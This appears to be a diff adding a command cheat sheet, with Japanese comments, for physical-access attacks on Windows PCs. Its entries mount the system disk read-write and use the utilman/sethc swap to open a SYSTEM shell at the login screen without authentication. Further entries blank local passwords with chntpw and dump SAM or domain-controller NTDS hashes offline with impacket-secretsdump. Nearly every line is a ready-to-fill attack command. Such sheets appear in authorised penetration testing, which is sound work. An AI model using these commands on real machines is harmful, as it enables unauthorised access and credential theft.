@@ -1,0 +1,34 @@
+% 物理, lsblk
+
+# lsblk: 挿した PC のディスクを見る（-f。BitLocker ならここで終わる）
+lsblk -f
+
+
+% 物理, ntfs-3g
+
+# ntfs-3g: 挿した Windows の C: を書き込みでマウントする（高速スタートアップのあとは ro。そのときは Windows を再起動してから）
+sudo mkdir -p <mnt_dir> && sudo ntfs-3g <disk_part> <mnt_dir>
+
+
+% 物理, utilman
+
+# utilman/sethc: ログイン画面から認証なしで SYSTEM シェルを出す（BitLocker 無しのみ。DC で chntpw が効かない時の本命）
+(cd <mnt_point>/Windows/System32 && <bypass_target>)
+
+
+% 物理, chntpw
+
+# chntpw: 挿した Windows のローカルユーザーの一覧を見る・パスワードを空にする（対話で 1 → q → y。空のまま Enter でログイン）
+(cd <mnt_point>/Windows/System32/config && sudo chntpw <chntpw_act>)
+
+
+% 物理, secretsdump
+
+# impacket-secretsdump: マウントした Windows から offline でハッシュを抜く（LOCAL。ローカル=SAM／DC=NTDS を選ぶ。SYSTEM で復号）
+(cd <mnt_point>/Windows && sudo impacket-secretsdump <dump_src> LOCAL)
+
+
+% 物理, umount
+
+# umount: マウントしたディスクを外す（中にいると busy になるので先に cd）
+cd && sudo umount <mnt_point>
